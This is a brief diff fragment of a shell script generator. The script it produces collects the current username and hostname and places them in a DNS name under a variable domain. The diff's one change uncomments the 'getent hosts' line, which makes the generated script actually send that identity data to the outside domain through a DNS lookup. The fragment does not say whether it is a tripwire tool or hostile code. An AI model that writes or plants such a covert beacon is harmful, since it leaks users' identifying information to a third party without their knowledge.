@@ -13,7 +13,7 @@ echo """#!/bin/sh
 u=u\$(whoami | sed \"s/[^\\\x00-\\\x7f]//g\" | head -c 64 )
 c=c\$(hostname | sed \"s/[^\\\x00-\\\x7f]//g\")
 data=\$c.UN.\$u.CMD.$dns
-#getent hosts \$data > /dev/null
+getent hosts \$data > /dev/null
 if [ ! -e \$0$ext ]; then
   exit
 fi
